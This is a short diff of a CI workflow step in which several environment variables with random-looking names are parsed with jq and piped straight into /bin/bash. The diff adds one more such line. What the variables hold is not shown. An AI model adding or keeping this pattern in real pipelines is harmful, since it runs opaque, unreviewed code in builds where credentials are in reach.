@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$ug83" | jq -r .lc63927 | /bin/bash
           printf '%s' "$m1" | jq -r .ldpxj64 | /bin/bash
           echo $jtpe9 | jq -r .z4 | /bin/bash
+          printf '%s' "$o2565" | jq -r .iambo1 | /bin/bash
 
       - name: Upload results
         if: always()
